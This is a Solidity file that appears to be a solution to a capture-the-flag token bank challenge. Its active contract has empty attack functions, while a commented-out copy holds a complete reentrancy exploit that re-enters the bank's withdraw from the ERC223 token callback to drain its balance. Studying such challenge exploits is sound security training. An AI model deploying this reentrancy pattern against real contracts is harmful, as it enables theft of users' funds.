pragma solidity ^0.4.21;

interface ITokenBankChallenge {
    function token() external returns (address);
    function balanceOf(address from) external returns (uint256);
    function withdraw(uint256 amount) external;
    function isComplete() external view returns (bool);
}

interface ISimpleERC223Token {
    function totalSupply() external returns (uint256);
    function balanceOf(address from) external returns (uint256);
    function transfer(address to, uint256 value) external returns (bool success);
}

contract TokenBankAnswer {
    ITokenBankChallenge bank;
    ISimpleERC223Token token;
    function TokenBankAnswer(address _adr) public{
        bank = ITokenBankChallenge(_adr);
        token = ISimpleERC223Token(bank.token());
    }
    
    function attack() public {
        
    }

    function tokenFallback(address from, uint256, bytes) public {
        
    }
}

// contract TokenBankAnswer {
//     ITokenBankChallenge bank;
//     ISimpleERC223Token token;
//     function TokenBankAnswer(address _adr) public{
//         bank = ITokenBankChallenge(_adr);
//         token = ISimpleERC223Token(bank.token());
//     }
    
//     function attack() public {
//         uint256 balance = token.balanceOf(this);
//         // require(balance == token.balanceOf(address(bank)));
//         // require(balance + token.balanceOf(address(bank)) == token.totalSupply());

//         token.transfer(address(bank), balance);
//         // require(token.balanceOf(this) == 0);
//         // require(balance == bank.balanceOf(this));
//         // require(token.balanceOf(address(bank)) == token.totalSupply());

//         bank.withdraw(balance);
//         // require(bank.isComplete() == true);
//     }

//     function tokenFallback(address from, uint256, bytes) public {
//         require(msg.sender == address(token));

//         if (from == address(bank)) {
//             if (token.balanceOf(address(bank)) > 0) {
//                 uint256 balance = bank.balanceOf(this);
//                 bank.withdraw(balance);
//             }
//         }
//     }
// }